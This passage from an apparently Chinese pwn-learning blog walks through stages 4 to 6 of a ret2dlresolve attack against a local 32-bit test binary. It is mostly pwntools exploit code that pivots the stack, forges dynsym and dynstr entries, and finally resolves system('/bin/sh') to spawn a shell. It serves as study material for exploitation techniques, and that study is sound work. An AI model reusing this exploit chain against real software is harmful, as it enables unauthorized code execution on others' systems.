p32(<span class="number">1</span>) + p32(bss + offset + <span class="number">0x80</span>) + p32(<span class="number">0x8</span>)</span><br><span class="line">    payload += p32(write_got) + p32(r_info)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">COPY</span><br></pre></td></tr></table></figure>

<h4 id="stage4"><a href="#stage4" class="headerlink" title="stage4"></a>stage4</h4><p>在 <a href="http://ethushiroha.com/?p=869#stage3">stage3</a> 的基础上, 用一个较大的 <code>offset</code> 使得 <code>dynsym</code> 也被伪造</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./test&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/gstalker/buu/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x0804a020</span></span><br><span class="line">offset = <span class="number">0x200</span></span><br><span class="line">stack = bss + offset</span><br><span class="line">leave_ret = <span class="number">0x08048458</span></span><br><span class="line">main = <span class="number">0x0804845A</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">ppp_ret = <span class="number">0x080484f9</span></span><br><span class="line">pop_ebp = <span class="number">0x080484fb</span></span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">plt0 = <span class="number">0x080482F0</span></span><br><span class="line">rel_plt = <span class="number">0x080482b0</span></span><br><span class="line">dynsym = <span class="number">0x080481cc</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">command = <span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    gdb.attach(sh,command)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">borrowStack</span>():</span></span><br><span class="line">    junk = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span></span><br><span class="line">    payload = junk + p32(bss + offset)</span><br><span class="line">    payload += p32(read_plt) + p32(ppp_ret) </span><br><span class="line">    payload += p32(<span class="number">0</span>) + p32(bss + offset) + p32(<span class="number">0x200</span>)</span><br><span class="line">    payload += p32(pop_ebp) + p32(bss + offset) + p32(leave_ret)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;vuln&quot;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over1</span>():</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x4</span></span><br><span class="line">    payload += p32(write) + p32(main)</span><br><span class="line">    payload += p32(<span class="number">1</span>) + p32(bss + offset + <span class="number">0x80</span>) + p32(<span class="number">0x8</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over2</span>():</span></span><br><span class="line">    write_index = (write - plt0) / <span class="number">16</span> - <span class="number">1</span></span><br><span class="line">    write_index *= <span class="number">8</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span></span><br><span class="line">    payload += p32(plt0)</span><br><span class="line">    payload += p32(<span class="built_in">int</span>(write_index)) + p32(<span class="number">0xdead</span>)</span><br><span class="line">    payload += p32(<span class="number">1</span>) + p32(bss + offset + <span class="number">0x80</span>) + p32(<span class="number">0x8</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over3</span>():</span></span><br><span class="line">    r_info = <span class="number">0x407</span></span><br><span class="line">    index_offset = (stack + <span class="number">28</span> - rel_plt)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span></span><br><span class="line">    payload += p32(plt0)</span><br><span class="line">    payload += p32(<span class="built_in">int</span>(index_offset)) + p32(<span class="number">0xdead</span>)</span><br><span class="line">    payload += p32(<span class="number">1</span>) + p32(bss + offset + <span class="number">0x80</span>) + p32(<span class="number">0x8</span>)</span><br><span class="line">    payload += p32(write_got) + p32(r_info)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over4</span>():</span></span><br><span class="line">    fake_sym_addr = stack + <span class="number">0x24</span></span><br><span class="line">    fake_sym = p32(<span class="number">0x31</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line">    align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">    <span class="comment"># but why align ??</span></span><br><span class="line">    <span class="comment"># in order to fix 0x10(the size of fake struct) ?</span></span><br><span class="line">    fake_sym_addr = fake_sym_addr + align</span><br><span class="line">    index_fake_sym = <span class="built_in">int</span>((fake_sym_addr - dynsym) / <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    index_offset = stack + <span class="number">28</span> - rel_plt</span><br><span class="line">    r_info = (index_fake_sym &lt;&lt; <span class="number">8</span>) + <span class="number">0x7</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span></span><br><span class="line">    payload += p32(plt0)</span><br><span class="line">    payload += p32(<span class="built_in">int</span>(index_offset)) + p32(<span class="number">0xdead</span>)</span><br><span class="line">    payload += p32(<span class="number">1</span>) + p32(bss + offset + <span class="number">0x80</span>) + p32(<span class="number">0x8</span>)</span><br><span class="line">    payload += p32(write_got) + p32(r_info)</span><br><span class="line">    payload += <span class="string">b&#x27;a&#x27;</span> * align</span><br><span class="line">    payload += fake_sym</span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    sh.send(payload)    </span><br><span class="line">COPY</span><br></pre></td></tr></table></figure>

<h4 id="stage5"><a href="#stage5" class="headerlink" title="stage5"></a>stage5</h4><p>对 <code>st_name</code> 越界,并且在伪造的 <code>dynsym</code> 结构体下面伪造 <code>dynstr</code> 字符串</p>
<p>这个字符串将帮助我们找到函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./test&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/gstalker/buu/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x0804a020</span></span><br><span class="line">offset = <span class="number">0x200</span></span><br><span class="line">stack = bss + offset</span><br><span class="line">leave_ret = <span class="number">0x08048458</span></span><br><span class="line">main = <span class="number">0x0804845A</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">ppp_ret = <span class="number">0x080484f9</span></span><br><span class="line">pop_ebp = <span class="number">0x080484fb</span></span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">plt0 = <span class="number">0x080482F0</span></span><br><span class="line">rel_plt = <span class="number">0x080482b0</span></span><br><span class="line">dynsym = <span class="number">0x080481cc</span></span><br><span class="line">dynstr = <span class="number">0x0804822C</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">command = <span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    gdb.attach(sh,command)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">borrowStack</span>():</span></span><br><span class="line">    junk = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span></span><br><span class="line">    payload = junk + p32(bss + offset)</span><br><span class="line">    payload += p32(read_plt) + p32(ppp_ret) </span><br><span class="line">    payload += p32(<span class="number">0</span>) + p32(bss + offset) + p32(<span class="number">0x200</span>)</span><br><span class="line">    payload += p32(pop_ebp) + p32(bss + offset) + p32(leave_ret)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;vuln&quot;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over1</span>():</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x4</span></span><br><span class="line">    payload += p32(write) + p32(main)</span><br><span class="line">    payload += p32(<span class="number">1</span>) + p32(bss + offset + <span class="number">0x80</span>) + p32(<span class="number">0x8</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over2</span>():</span></span><br><span class="line">    write_index = (write - plt0) / <span class="number">16</span> - <span class="number">1</span></span><br><span class="line">    write_index *= <span class="number">8</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span></span><br><span class="line">    payload += p32(plt0)</span><br><span class="line">    payload += p32(<span class="built_in">int</span>(write_index)) + p32(<span class="number">0xdead</span>)</span><br><span class="line">    payload += p32(<span class="number">1</span>) + p32(bss + offset + <span class="number">0x80</span>) + p32(<span class="number">0x8</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over3</span>():</span></span><br><span class="line">    r_info = <span class="number">0x407</span></span><br><span class="line">    index_offset = (stack + <span class="number">28</span> - rel_plt)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span></span><br><span class="line">    payload += p32(plt0)</span><br><span class="line">    payload += p32(<span class="built_in">int</span>(index_offset)) + p32(<span class="number">0xdead</span>)</span><br><span class="line">    payload += p32(<span class="number">1</span>) + p32(bss + offset + <span class="number">0x80</span>) + p32(<span class="number">0x8</span>)</span><br><span class="line">    payload += p32(write_got) + p32(r_info)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over4</span>():</span></span><br><span class="line">    fake_sym_addr = stack + <span class="number">0x24</span></span><br><span class="line">    fake_sym = p32(<span class="number">0x31</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line">    align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>) </span><br><span class="line">    <span class="comment"># why align ????????</span></span><br><span class="line">    fake_sym_addr = fake_sym_addr + align</span><br><span class="line">    index_fake_sym = <span class="built_in">int</span>((fake_sym_addr - dynsym) / <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    index_offset = stack + <span class="number">28</span> - rel_plt</span><br><span class="line">    r_info = (index_fake_sym &lt;&lt; <span class="number">8</span>) + <span class="number">0x7</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span></span><br><span class="line">    payload += p32(plt0)</span><br><span class="line">    payload += p32(<span class="built_in">int</span>(index_offset)) + p32(<span class="number">0xdead</span>)</span><br><span class="line">    payload += p32(<span class="number">1</span>) + p32(bss + offset + <span class="number">0x80</span>) + p32(<span class="number">0x8</span>)</span><br><span class="line">    payload += p32(write_got) + p32(r_info)</span><br><span class="line">    payload += <span class="string">b&#x27;a&#x27;</span> * align</span><br><span class="line">    payload += fake_sym</span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    sh.send(payload)    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over5</span>():</span></span><br><span class="line"></span><br><span class="line">    fake_sym_addr = stack + <span class="number">0x24</span></span><br><span class="line">    align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>) </span><br><span class="line">    <span class="comment"># why align ????????</span></span><br><span class="line">    fake_sym_addr = fake_sym_addr + align</span><br><span class="line">    fake_str_addr = fake_sym_addr - dynstr + <span class="number">0x10</span> </span><br><span class="line">    <span class="comment"># make the fake dynstr table below the dynsym table</span></span><br><span class="line">    <span class="comment"># 0x10 is the size of struct (offfset 0 0 0x12)</span></span><br><span class="line">    index_fake_sym = <span class="built_in">int</span>((fake_sym_addr - dynsym) / <span class="number">16</span>)</span><br><span class="line">    fake_sym = p32(fake_str_addr) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">    index_offset = stack + <span class="number">28</span> - rel_plt</span><br><span class="line">    r_info = (index_fake_sym &lt;&lt; <span class="number">8</span>) + <span class="number">0x7</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span></span><br><span class="line">    payload += p32(plt0)</span><br><span class="line">    payload += p32(<span class="built_in">int</span>(index_offset)) + p32(<span class="number">0xdead</span>)</span><br><span class="line">    payload += p32(<span class="number">1</span>) + p32(bss + offset + <span class="number">0x80</span>) + p32(<span class="number">0x8</span>)</span><br><span class="line">    payload += p32(write_got) + p32(r_info)</span><br><span class="line">    payload += <span class="string">b&#x27;a&#x27;</span> * align</span><br><span class="line">    payload += fake_sym</span><br><span class="line">    payload += <span class="string">b&#x27;write\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    sh.send(payload)   </span><br><span class="line">COPY</span><br></pre></td></tr></table></figure>

<h4 id="stage6"><a href="#stage6" class="headerlink" title="stage6"></a>stage6</h4><p>只需要在 <a href="http://ethushiroha.com/?p=869#stage5">stage5</a> 的基础上修改 <code>dynstr</code> 的值和参数就可以了</p>
<p><strong>注: 我在一开始直接改的时候发现直接 <code>EOF</code> 了, 所以调整栈迁移之后的大小为 <code>0x500</code> 这样就不报错了(理由暂且未知)</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./test&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/gstalker/buu/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x0804a020</span></span><br><span class="line">offset = <span class="number">0x500</span></span><br><span class="line">stack = bss + offset</span><br><span class="line">leave_ret = <span class="number">0x08048458</span></span><br><span class="line">main = <span class="number">0x0804845A</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">ppp_ret = <span class="number">0x080484f9</span></span><br><span class="line">pop_ebp = <span class="number">0x080484fb</span></span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">plt0 = <span class="number">0x080482F0</span></span><br><span class="line">rel_plt = <span class="number">0x080482b0</span></span><br><span class="line">dynsym = <span class="number">0x080481cc</span></span><br><span class="line">dynstr = <span class="number">0x0804822C</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">command = <span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    gdb.attach(sh,command)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">borrowStack</span>():</span></span><br><span class="line">    junk = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span></span><br><span class="line">    payload = junk + p32(bss + offset)</span><br><span class="line">    payload += p32(read_plt) + p32(ppp_ret) </span><br><span class="line">    payload += p32(<span class="number">0</span>) + p32(bss + offset) + p32(<span class="number">0x100</span>)</span><br><span class="line">    payload += p32(pop_ebp) + p32(bss + offset) + p32(leave_ret)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;vuln&quot;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over1</span>():</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x4</span></span><br><span class="line">    payload += p32(write) + p32(main)</span><br><span class="line">    payload += p32(<span class="number">1</span>) + p32(bss + offset + <span class="number">0x80</span>) + p32(<span class="number">0x8</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over2</span>():</span></span><br><span class="line">    write_index = (write - plt0) / <span class="number">16</span> - <span class="number">1</span></span><br><span class="line">    write_index *= <span class="number">8</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span></span><br><span class="line">    payload += p32(plt0)</span><br><span class="line">    payload += p32(<span class="built_in">int</span>(write_index)) + p32(<span class="number">0xdead</span>)</span><br><span class="line">    payload += p32(<span class="number">1</span>) + p32(bss + offset + <span class="number">0x80</span>) + p32(<span class="number">0x8</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over3</span>():</span></span><br><span class="line">    r_info = <span class="number">0x407</span></span><br><span class="line">    index_offset = (stack + <span class="number">28</span> - rel_plt)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span></span><br><span class="line">    payload += p32(plt0)</span><br><span class="line">    payload += p32(<span class="built_in">int</span>(index_offset)) + p32(<span class="number">0xdead</span>)</span><br><span class="line">    payload += p32(<span class="number">1</span>) + p32(bss + offset + <span class="number">0x80</span>) + p32(<span class="number">0x8</span>)</span><br><span class="line">    payload += p32(write_got) + p32(r_info)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over4</span>():</span></span><br><span class="line">    fake_sym_addr = stack + <span class="number">0x24</span></span><br><span class="line">    fake_sym = p32(<span class="number">0x31</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line">    align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>) </span><br><span class="line">    <span class="comment"># why align ????????</span></span><br><span class="line">    fake_sym_addr = fake_sym_addr + align</span><br><span class="line">    index_fake_sym = <span class="built_in">int</span>((fake_sym_addr - dynsym) / <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    index_offset = stack + <span class="number">28</span> - rel_plt</span><br><span class="line">    r_info = (index_fake_sym &lt;&lt; <span class="number">8</span>) + <span class="number">0x7</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span></span><br><span class="line">    payload += p32(plt0)</span><br><span class="line">    payload += p32(<span class="built_in">int</span>(index_offset)) + p32(<span class="number">0xdead</span>)</span><br><span class="line">    payload += p32(<span class="number">1</span>) + p32(bss + offset + <span class="number">0x80</span>) + p32(<span class="number">0x8</span>)</span><br><span class="line">    payload += p32(write_got) + p32(r_info)</span><br><span class="line">    payload += <span class="string">b&#x27;a&#x27;</span> * align</span><br><span class="line">    payload += fake_sym</span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    sh.send(payload)    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over5</span>():</span></span><br><span class="line">    fake_sym_addr = stack + <span class="number">0x24</span></span><br><span class="line">    align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>) </span><br><span class="line">    <span class="comment"># why align ????????</span></span><br><span class="line">    fake_sym_addr = fake_sym_addr + align</span><br><span class="line">    fake_str_addr = fake_sym_addr - dynstr + <span class="number">0x10</span> </span><br><span class="line">    <span class="comment"># 0x10 is the size of struct (offfset 0 0 0x12)</span></span><br><span class="line">    index_fake_sym = <span class="built_in">int</span>((fake_sym_addr - dynsym) / <span class="number">16</span>)</span><br><span class="line">    fake_sym = p32(fake_str_addr) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">    index_offset = stack + <span class="number">28</span> - rel_plt</span><br><span class="line">    r_info = (index_fake_sym &lt;&lt; <span class="number">8</span>) + <span class="number">0x7</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span></span><br><span class="line">    payload += p32(plt0)</span><br><span class="line">    payload += p32(<span class="built_in">int</span>(index_offset)) + p32(<span class="number">0xdead</span>)</span><br><span class="line">    payload += p32(<span class="number">1</span>) + p32(bss + offset + <span class="number">0x80</span>) + p32(<span class="number">0x8</span>)</span><br><span class="line">    payload += p32(write_got) + p32(r_info)</span><br><span class="line">    payload += <span class="string">b&#x27;a&#x27;</span> * align</span><br><span class="line">    payload += fake_sym</span><br><span class="line">    payload += <span class="string">b&#x27;write\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    sh.send(payload)   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over6</span>():</span></span><br><span class="line">    fake_sym_addr = stack + <span class="number">0x24</span></span><br><span class="line">    align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>) </span><br><span class="line">    <span class="comment"># why align ????????</span></span><br><span class="line">    fake_sym_addr = fake_sym_addr + align</span><br><span class="line">    fake_str_addr = fake_sym_addr - dynstr + <span class="number">0x10</span> </span><br><span class="line">    <span class="comment"># 0x10 is the size of struct (offfset 0 0 0x12)</span></span><br><span class="line">    index_fake_sym = <span class="built_in">int</span>((fake_sym_addr - dynsym) / <span class="number">16</span>)</span><br><span class="line">    fake_sym = p32(fake_str_addr) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">    index_offset = stack + <span class="number">28</span> - rel_plt</span><br><span class="line">    r_info = (index_fake_sym &lt;&lt; <span class="number">8</span>) + <span class="number">0x7</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span></span><br><span class="line">    payload += p32(plt0)</span><br><span class="line">    payload += p32(<span class="built_in">int</span>(index_offset)) + p32(main)</span><br><span class="line">    payload += p32(stack + <span class="number">0x80</span>)</span><br><span class="line">    payload += p32(stack + <span class="number">0x80</span>) + p32(<span class="number">8</span>)</span><br><span class="line">    payload += p32(write_got) + p32(r_info)</span><br><span class="line">    payload += <span class="string">b&#x27;a&#x27;</span> * align <span class="comment"># padding</span></span><br><span class="line">    payload += fake_sym</span><br><span class="line">    payload += <span class="string">b&#x27;system\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="comment">#dbg(&quot;b *&#123;&#125;&quot;.format(plt0))</span></span><br><span class="line">    sh.send(payload)   COPY</span><br></pre></td></tr></table></figure>

<h3 id="理解"><a href="#理解" class="headerlink" title="理解"></a>理解</h3><p>目前 不懂的地方就是 <code>align</code> 变量了,难不成是为了字节对齐?</p>
]]></content>
      <categories>
        <category>pwn</category>
        <category>ROP</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ROP</tag>
      </tags>
  </entry>
</search>
